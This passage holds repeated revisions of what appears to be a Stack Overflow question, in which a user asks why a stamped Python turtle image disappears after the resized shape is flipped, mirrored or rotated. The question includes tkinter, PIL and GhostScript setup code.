9.18 for Windows found and utilized"")elif her == 'darwin': print(""Macintosh is your Operating System"") if shutil.which(""gs"") is None: os.environ[""PATH""] += "":/usr/local/bin"" if shutil.which(""gs"") is None: print(""You do not have GhostScript installed for Macintosh. Please install it."") sys.exit(0) else: print(""GhostScript for Macintosh found and utilized"")from turtle import *from tkinter import *try: import tkinter.filedialog as filedialogexcept ImportError: passimport collectionsfrom PIL import Image, ImageEnhance, ImageOpsjiop = collections.deque()pictures = collections.deque()edited = collections.deque()picwidth = collections.deque()picheight = collections.deque()def draw_space(): # Draw a space 200 pixels wide. penup() forward(200) pendown()def TurtleShape(): try: manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) rotateButton.config(state = NORMAL) global klob klob = filedialog.askopenfilename() global im im = Image.open(klob) pictures.append(im) edited.clear() im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except AttributeError: passdef TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size[0] height = im.size[1] NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) Picwidth = NewOne2 if NewOne2 != None else width picwidth.append(Picwidth) Picheight = NewOne if NewOne != None else height picheight.append(Picheight) try: try: hye = jiop.pop() jiop.append(hye) except: hye = edited.pop() jiop.append(hye) editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) pictures.append(editpic) except: geer = pictures.pop() editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update()def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: jiop.clear() ghy = edited.pop() kpl = ImageOps.flip(ghy) edited.append(kpl) pictures.append(kpl) print(""Jlop"") except: neer = pictures.pop() kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() fgrt = ImageOps.mirror(jui) edited.append(fgrt) pictures.append(fgrt) except: bbc = pictures.pop() fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) pictures.append(fetch) except: bolt = pictures.pop() fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update()def StampPic(): stamp() draw_space() update()def move_turtle(): # Pick up the turtle and move it to its starting location. penup() goto(-200, 100) pendown()def settings(): # Tkinter buttons turtlepic = Button(text = ""Set Turtle Image"", command = TurtleShape) turtlepic.pack(side = 'left') stampimage = Button(text = ""Stamp"", command = StampPic) stampimage.pack(side = 'left') global manipulateimage manipulateimage = Button(text = ""Resize Turtle Image"", command = TurtleImageResize, state = DISABLED) manipulateimage.pack(side = 'left') global flipButton flipButton = Button(text = ""Flip image"", command = flippic, state = DISABLED) flipButton.pack(side = 'left') global mirrorButton mirrorButton = Button(text = ""Mirror Image"", command = mirror, state = DISABLED) mirrorButton.pack(side = 'left') global rotateButton rotateButton = Button(text = ""Rotate Image"", command = rotatePic, state = DISABLED) rotateButton.pack(side = 'left')def skip(x, y): penup() goto(x, y) pendown() update()move_turtle()settings()speed(0)tracer(0, 0)onscreenclick(skip)if sys.platform == 'win32': input()else: pass",Python turtle stamp mysteriously disappears after turtle shape's image manipulation
Python turtle stamp disappearing after turtle's image manipulation," Orientation:I have created the following functions to allow the user to change the turtle to an image of the his/her choosing and then stamp it to the canvas at any point: The image can also be manipulated to the user's choosing by these other functions:Resize function This function works either as a first or secondary function. First meaning that it is called initially, and secondary meaning it edits an already edited image. So, if ONLY called first, this function will take the image appended to the pictures deque, resize that, and output the edited image as a .gif image, which will be the new shape of the turtle. However, if called two times or more in a row, because of an issue where resizing the same picture more than once will result in a distorted image, I had to create another deque jiop which saves the original item from the pictures deque, and whenever this function is called more than once in a row, that original image is resized every time, instead of the same image each time. But, if ONLY called as a secondary function, then the function will simply take the current image from the edited deque, resize that image, and then set that as the turtle's new shape: Flip, Rotate, and Mirror functions - These work rather simpler than the resize function above. If called initially, they each will take the image from the pictures deque, manipulate it, append that edited image to the edited deque, then change the turtle ""shape"" to that new image. However, if called second, they each will take the image from the edited deque, manipulate that, re-append the manipulated image back to the edited deque, then set that as the turtle's new ""shape"". These functions are shown below: This way ALL the editing functions work together on essentially the same fundamental image. The Issue:Now, consider that the user wants to take the turtle image and then resize it to the size, for instance, 800x400, and stamp it to a specific spot on the canvas. After that, the user decides to move the turtle image to another spot on the canvas, flip the image, and then stamp the image there. There should now be two images right? One stamped, and the other flipped? However, with my program, for some reason, that is not the case. Instead, the stamped image disappears the moment the user flips the turtle image, even though there is no clear() function to be found anywhere (to show you what I mean, refer to the edit below). Apparently this issue ONLY occurs after the TurtleImageResize function is called.What is wrong in my TurtleImageResize function that is leading to this issue? I had completely revamped the turtle shape's image management process to what it is right now in hopes that it will fix this issue that I was also experiencing with my previous setup, but apparently, that is STILL not the case. Therefore, any help with this issue is greatly appreciated!EDIT: Below is a minimal, complete, and verifiable way to reproduce the issue I am having (MUST have PIL (or Pillow) and GhostScript installed in order for this to work): When/if you have both GhostScript and PIL (or Pillow) installed on your system, to reproduce my issue, please do the following (All steps required except step # 4):Click the Set Turtle Image button at bottom of window, select any image you want the turtle to be, then press Open. The turtle gets set to that image.Resize the Image to 800x400 (or any other size you want) by pressing the Resize turtle Image button at the bottom of the screen. Two dialogs will pop up in succession. Enter the width of 800 (or your own width) in the first dialog, and then enter the height of 400 (or your own height) in the second dialog, and after you finish, the image will change size according to the dimensions provided (or set image back to the original dimension(s) depending on whether or not you pressed cancel).Select the Stamp button at the bottom of the window. The image is stamped onto the canvas, and the turtle moves forward 400 pixels ""behind"" the stamped image.OPTIONAL: Click anywhere on the canvas to take the turtle to that spot.Flip/mirror/rotate the image.As you can see, after doing all this, just as you flip/mirror/rotate the image, the stamped image just disappears. What is wrong with my TurtleImageResize function that is causing this to occur?EDIT # 2: Just in case this information is useful, I am running Python 3.5.1 on a Macintosh with OS version 10.11.2 (El Capitan). <code>  def TurtleShape(): try: # Tkinter buttons related to turtle manipulation manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) originalButton.config(state = NORMAL) resetturtle.config(state = NORMAL) rotateButton.config(state = NORMAL) # Ask user for file name from tkinter file dialog, and return file name as `klob` global klob klob = filedialog.askopenfilename() global im # Open `klob` and return as `im` im = Image.open(klob) # Append `im` to pictures deque pictures.append(im) # Clear `edited` deque edited.clear() # Save `im` as an image, then register image as shape, and finally set image as turtle shape im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except: # If user selects cancel in file dialog, then pass passdef StampPic(): stamp() draw_space() # Go forward 100 pixels with pen up after every stamp update() def TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size[0] # height = original height of image height = im.size[1] # Allow user to enter new width for image NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) # Allow user to enter new height for image NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) # Set width to user input if user input is NOT nothing. Otherwise, use `width` as picture width. Picwidth = NewOne2 if NewOne2 != None else width # Set height to user input if user input is NOT None. Otherwise, use `height` as picture height. Picheight = NewOne if NewOne != None else height try: # Secondary Step: Take ORIGINAL image appended to `jiop` (from `except:` code block succeeding `try:` code block) and resize THAT image each time this function is called twice in a row. Otherwise, if ONLY called as a secondary step, take previously edited image from `edited` deque, resize that, and append newly edited image to the `edited` deque. try: # `jiop` is a deque hye = jiop.pop() jiop.append(hye) print(""Jiop"") except: hye = edited.pop() jiop.append(hye) print(""Edited"") # Resize Image to Picwidth and Picheight editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) print(""Hooplah!"") except: # Intial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` geer = pictures.pop() # Resize Image to Picwidth and Picheight editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) print(""Normal"") # Save image as `.gif` editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') # Register image as a shape, and use it as shape of turtle register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update() def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: # Secondary step: Take previously edited image from `edited` deque, manipulate that, and append newly edited image to the `edited` deque jiop.clear() ghy = edited.pop() # Flip image over horizontal line kpl = ImageOps.flip(ghy) edited.append(kpl) print(""Jlop"") except: # Initial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` neer = pictures.pop() # Flip image over horizontal line kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") # Save image as `.gif` kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") # Register image as a shape, and use it as shape of turtle register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() # Flip image over vertical line fgrt = ImageOps.mirror(jui) edited.append(fgrt) except: bbc = pictures.pop() # Flip image over vertical line fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() # Rotate image 90 right fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) except: bolt = pictures.pop() # Rotate image 90 right fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update() import os,shutil,subprocess, sysher = sys.platformif her == ""win32"": print(""Windows is your Operating System"") win_gs = [""gs"",""gswin32c"",""gswin64c""] if all( shutil.which(gs_version) is None for gs_version in win_gs ): paths = [""C:\\Program Files\\gs\\gs9.18\\bin"",""C:\\Program Files (x86)\\gs\\gs9.18\\bin""] for path in (x for x in paths if os.path.exists(x)): os.environ[""PATH""] += "";"" + path break if any( shutil.which(gs_version) for gs_version in win_gs ): print(""GhostScript 9.18 for Windows found and utilized"") else: print(""You do not have GhostScript 9.18 installed for Windows. Please install it."") sys.exit(0) else: print(""GhostScript 9.18 for Windows found and utilized"")elif her == 'darwin': print(""Macintosh is your Operating System"") if shutil.which(""gs"") is None: os.environ[""PATH""] += "":/usr/local/bin"" if shutil.which(""gs"") is None: print(""You do not have GhostScript installed for Macintosh. Please install it."") sys.exit(0) else: print(""GhostScript for Macintosh found and utilized"")from turtle import *from tkinter import *try: import tkinter.filedialog as filedialogexcept ImportError: passimport collectionsfrom PIL import Image, ImageEnhance, ImageOpsjiop = collections.deque()pictures = collections.deque()edited = collections.deque()picwidth = collections.deque()picheight = collections.deque()def draw_space(): # Draw a space 200 pixels wide. penup() forward(200) pendown()def TurtleShape(): try: manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) rotateButton.config(state = NORMAL) global klob klob = filedialog.askopenfilename() global im im = Image.open(klob) pictures.append(im) edited.clear() im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except AttributeError: passdef TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size[0] height = im.size[1] NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) Picwidth = NewOne2 if NewOne2 != None else width picwidth.append(Picwidth) Picheight = NewOne if NewOne != None else height picheight.append(Picheight) try: try: hye = jiop.pop() jiop.append(hye) except: hye = edited.pop() jiop.append(hye) editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) pictures.append(editpic) except: geer = pictures.pop() editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update()def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: jiop.clear() ghy = edited.pop() kpl = ImageOps.flip(ghy) edited.append(kpl) pictures.append(kpl) print(""Jlop"") except: neer = pictures.pop() kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() fgrt = ImageOps.mirror(jui) edited.append(fgrt) pictures.append(fgrt) except: bbc = pictures.pop() fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) pictures.append(fetch) except: bolt = pictures.pop() fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update()def StampPic(): stamp() draw_space() update()def move_turtle(): # Pick up the turtle and move it to its starting location. penup() goto(-200, 100) pendown()def settings(): # Tkinter buttons turtlepic = Button(text = ""Set Turtle Image"", command = TurtleShape) turtlepic.pack(side = 'left') stampimage = Button(text = ""Stamp"", command = StampPic) stampimage.pack(side = 'left') global manipulateimage manipulateimage = Button(text = ""Resize Turtle Image"", command = TurtleImageResize, state = DISABLED) manipulateimage.pack(side = 'left') global flipButton flipButton = Button(text = ""Flip image"", command = flippic, state = DISABLED) flipButton.pack(side = 'left') global mirrorButton mirrorButton = Button(text = ""Mirror Image"", command = mirror, state = DISABLED) mirrorButton.pack(side = 'left') global rotateButton rotateButton = Button(text = ""Rotate Image"", command = rotatePic, state = DISABLED) rotateButton.pack(side = 'left')def skip(x, y): penup() goto(x, y) pendown() update()move_turtle()settings()speed(0)tracer(0, 0)onscreenclick(skip)if sys.platform == 'win32': input()else: pass",Python turtle stamp mysteriously disappears after turtle shape's image manipulation
Python turtle stamp disappearing after turtle's image manipulation *Edited*," Orientation:I have created the following functions to allow the user to change the turtle to an image of the his/her choosing and then stamp it to the canvas at any point: The image can also be manipulated to the user's choosing by these other functions:Resize function This function works either as a first or secondary function. First meaning that it is called initially, and secondary meaning it edits an already edited image. So, if ONLY called first, this function will take the image appended to the pictures deque, resize that, and output the edited image as a .gif image, which will be the new shape of the turtle. However, if called two times or more in a row, because of an issue where resizing the same picture more than once will result in a distorted image, I had to create another deque jiop which saves the original item from the pictures deque, and whenever this function is called more than once in a row, that original image is resized every time, instead of the same image each time. But, if ONLY called as a secondary function, then the function will simply take the current image from the edited deque, resize that image, and then set that as the turtle's new shape: Flip, Rotate, and Mirror functions - These work rather simpler than the resize function above. If called initially, they each will take the image from the pictures deque, manipulate it, append that edited image to the edited deque, then change the turtle ""shape"" to that new image. However, if called second, they each will take the image from the edited deque, manipulate that, re-append the manipulated image back to the edited deque, then set that as the turtle's new ""shape"". These functions are shown below: This way ALL the editing functions work together on essentially the same fundamental image. The Issue:Now, consider that the user wants to take the turtle image and then resize it to the size, for instance, 800x400, and stamp it to a specific spot on the canvas. After that, the user decides to move the turtle image to another spot on the canvas, flip the image, and then stamp the image there. There should now be two images right? One stamped, and the other flipped? However, with my program, for some reason, that is not the case. Instead, the stamped image disappears the moment the user flips the turtle image, even though there is no clear() function to be found anywhere (to show you what I mean, refer to the edit below). Apparently this issue ONLY occurs after the TurtleImageResize function is called.What is wrong in my TurtleImageResize function that is leading to this issue? I had completely revamped the turtle shape's image management process to what it is right now in hopes that it will fix this issue that I was also experiencing with my previous setup, but apparently, that is STILL not the case. Therefore, any help with this issue is greatly appreciated!EDIT: Below is a minimal, complete, and verifiable way to reproduce the issue I am having (MUST have PIL (or Pillow) and GhostScript installed in order for this to work): When/if you have both GhostScript and PIL (or Pillow) installed on your system, to reproduce my issue, please do the following (All steps required except step # 4):Click the Set Turtle Image button at bottom of window, select any image you want the turtle to be, then press Open. The turtle gets set to that image.Resize the Image to 800x400 (or any other size you want) by pressing the Resize turtle Image button at the bottom of the screen. Two dialogs will pop up in succession. Enter the width of 800 (or your own width) in the first dialog, and then enter the height of 400 (or your own height) in the second dialog, and after you finish, the image will change size according to the dimensions provided (or set image back to the original dimension(s) depending on whether or not you pressed cancel).Select the Stamp button at the bottom of the window. The image is stamped onto the canvas, and the turtle moves forward 400 pixels ""behind"" the stamped image.OPTIONAL: Click anywhere on the canvas to take the turtle to that spot.Flip/mirror/rotate the image.As you can see, after doing all this, just as you flip/mirror/rotate the image, the stamped image just disappears. What is wrong with my TurtleImageResize function that is causing this to occur?EDIT # 2: Just in case this information is useful, I am running Python 3.5.1 on a Macintosh with OS version 10.11.2 (El Capitan). <code>  def TurtleShape(): try: # Tkinter buttons related to turtle manipulation manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) originalButton.config(state = NORMAL) resetturtle.config(state = NORMAL) rotateButton.config(state = NORMAL) # Ask user for file name from tkinter file dialog, and return file name as `klob` global klob klob = filedialog.askopenfilename() global im # Open `klob` and return as `im` im = Image.open(klob) # Append `im` to pictures deque pictures.append(im) # Clear `edited` deque edited.clear() # Save `im` as an image, then register image as shape, and finally set image as turtle shape im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except: # If user selects cancel in file dialog, then pass passdef StampPic(): stamp() draw_space() # Go forward 100 pixels with pen up after every stamp update() def TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size[0] # height = original height of image height = im.size[1] # Allow user to enter new width for image NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) # Allow user to enter new height for image NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) # Set width to user input if user input is NOT nothing. Otherwise, use `width` as picture width. Picwidth = NewOne2 if NewOne2 != None else width # Set height to user input if user input is NOT None. Otherwise, use `height` as picture height. Picheight = NewOne if NewOne != None else height try: # Secondary Step: Take ORIGINAL image appended to `jiop` (from `except:` code block succeeding `try:` code block) and resize THAT image each time this function is called twice in a row. Otherwise, if ONLY called as a secondary step, take previously edited image from `edited` deque, resize that, and append newly edited image to the `edited` deque. try: # `jiop` is a deque hye = jiop.pop() jiop.append(hye) print(""Jiop"") except: hye = edited.pop() jiop.append(hye) print(""Edited"") # Resize Image to Picwidth and Picheight editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) print(""Hooplah!"") except: # Intial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` geer = pictures.pop() # Resize Image to Picwidth and Picheight editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) print(""Normal"") # Save image as `.gif` editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') # Register image as a shape, and use it as shape of turtle register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update() def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: # Secondary step: Take previously edited image from `edited` deque, manipulate that, and append newly edited image to the `edited` deque jiop.clear() ghy = edited.pop() # Flip image over horizontal line kpl = ImageOps.flip(ghy) edited.append(kpl) print(""Jlop"") except: # Initial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` neer = pictures.pop() # Flip image over horizontal line kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") # Save image as `.gif` kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") # Register image as a shape, and use it as shape of turtle register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() # Flip image over vertical line fgrt = ImageOps.mirror(jui) edited.append(fgrt) except: bbc = pictures.pop() # Flip image over vertical line fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() # Rotate image 90 right fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) except: bolt = pictures.pop() # Rotate image 90 right fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update() import os,shutil,subprocess, sysher = sys.platformif her == ""win32"": print(""Windows is your Operating System"") win_gs = [""gs"",""gswin32c"",""gswin64c""] if all( shutil.which(gs_version) is None for gs_version in win_gs ): paths = [""C:\\Program Files\\gs\\gs9.18\\bin"",""C:\\Program Files (x86)\\gs\\gs9.18\\bin""] for path in (x for x in paths if os.path.exists(x)): os.environ[""PATH""] += "";"" + path break if any( shutil.which(gs_version) for gs_version in win_gs ): print(""GhostScript 9.18 for Windows found and utilized"") else: print(""You do not have GhostScript 9.18 installed for Windows. Please install it."") sys.exit(0) else: print(""GhostScript 9.18 for Windows found and utilized"")elif her == 'darwin': print(""Macintosh is your Operating System"") if shutil.which(""gs"") is None: os.environ[""PATH""] += "":/usr/local/bin"" if shutil.which(""gs"") is None: print(""You do not have GhostScript installed for Macintosh. Please install it."") sys.exit(0) else: print(""GhostScript for Macintosh found and utilized"")from turtle import *from tkinter import *try: import tkinter.filedialog as filedialogexcept ImportError: passimport collectionsfrom PIL import Image, ImageEnhance, ImageOpsjiop = collections.deque()pictures = collections.deque()edited = collections.deque()picwidth = collections.deque()picheight = collections.deque()def draw_space(): # Draw a space 200 pixels wide. penup() forward(200) pendown()def TurtleShape(): try: manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) rotateButton.config(state = NORMAL) global klob klob = filedialog.askopenfilename() global im im = Image.open(klob) pictures.append(im) edited.clear() im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except AttributeError: passdef TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size[0] height = im.size[1] NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) Picwidth = NewOne2 if NewOne2 != None else width picwidth.append(Picwidth) Picheight = NewOne if NewOne != None else height picheight.append(Picheight) try: try: hye = jiop.pop() jiop.append(hye) except: hye = edited.pop() jiop.append(hye) editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) pictures.append(editpic) except: geer = pictures.pop() editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update()def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: jiop.clear() ghy = edited.pop() kpl = ImageOps.flip(ghy) edited.append(kpl) pictures.append(kpl) print(""Jlop"") except: neer = pictures.pop() kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() fgrt = ImageOps.mirror(jui) edited.append(fgrt) pictures.append(fgrt) except: bbc = pictures.pop() fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) pictures.append(fetch) except: bolt = pictures.pop() fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update()def StampPic(): stamp() draw_space() update()def move_turtle(): # Pick up the turtle and move it to its starting location. penup() goto(-200, 100) pendown()def settings(): # Tkinter buttons turtlepic = Button(text = ""Set Turtle Image"", command = TurtleShape) turtlepic.pack(side = 'left') stampimage = Button(text = ""Stamp"", command = StampPic) stampimage.pack(side = 'left') global manipulateimage manipulateimage = Button(text = ""Resize Turtle Image"", command = TurtleImageResize, state = DISABLED) manipulateimage.pack(side = 'left') global flipButton flipButton = Button(text = ""Flip image"", command = flippic, state = DISABLED) flipButton.pack(side = 'left') global mirrorButton mirrorButton = Button(text = ""Mirror Image"", command = mirror, state = DISABLED) mirrorButton.pack(side = 'left') global rotateButton rotateButton = Button(text = ""Rotate Image"", command = rotatePic, state = DISABLED) rotateButton.pack(side = 'left')def skip(x, y): penup() goto(x, y) pendown() update()move_turtle()settings()speed(0)tracer(0, 0)onscreenclick(skip)if sys.platform == 'win32': input()else: pass",Python turtle stamp mysteriously disappears after turtle shape's image manipulation
Python turtle stamp disappearing after turtle shape's manipulation," Orientation:I have created the following functions to allow the user to change the turtle to an image of the his/her choosing and then stamp it to the canvas at any point: The image can also be manipulated to the user's choosing by these other functions:Resize function This function works either as a first or secondary function. First meaning that it is called initially, and secondary meaning it edits an already edited image. So, if ONLY called first, this function will take the image appended to the pictures deque, resize that, and output the edited image as a .gif image, which will be the new shape of the turtle. However, if called two times or more in a row, because of an issue where resizing the same picture more than once will result in a distorted image, I had to create another deque jiop which saves the original item from the pictures deque, and whenever this function is called more than once in a row, that original image is resized every time, instead of the same image each time. But, if ONLY called as a secondary function, then the function will simply take the current image from the edited deque, resize that image, and then set that as the turtle's new shape: Flip, Rotate, and Mirror functions - These work rather simpler than the resize function above. If called initially, they each will take the image from the pictures deque, manipulate it, append that edited image to the edited deque, then change the turtle ""shape"" to that new image. However, if called second, they each will take the image from the edited deque, manipulate that, re-append the manipulated image back to the edited deque, then set that as the turtle's new ""shape"". These functions are shown below: This way ALL the editing functions work together on essentially the same fundamental image. The Issue:Now, consider that the user wants to take the turtle image and then resize it to the size, for instance, 800x400, and stamp it to a specific spot on the canvas. After that, the user decides to move the turtle image to another spot on the canvas, flip the image, and then stamp the image there. There should now be two images right? One stamped, and the other flipped? However, with my program, for some reason, that is not the case. Instead, the stamped image disappears the moment the user flips the turtle image, even though there is no clear() function to be found anywhere (to show you what I mean, refer to the edit below). Apparently this issue ONLY occurs after the TurtleImageResize function is called.What is wrong in my TurtleImageResize function that is leading to this issue? I had completely revamped the turtle shape's image management process to what it is right now in hopes that it will fix this issue that I was also experiencing with my previous setup, but apparently, that is STILL not the case. Therefore, any help with this issue is greatly appreciated!EDIT: Below is a minimal, complete, and verifiable way to reproduce the issue I am having (MUST have PIL (or Pillow) and GhostScript installed in order for this to work): When/if you have both GhostScript and PIL (or Pillow) installed on your system, to reproduce my issue, please do the following (All steps required except step # 4):Click the Set Turtle Image button at bottom of window, select any image you want the turtle to be, then press Open. The turtle gets set to that image.Resize the Image to 800x400 (or any 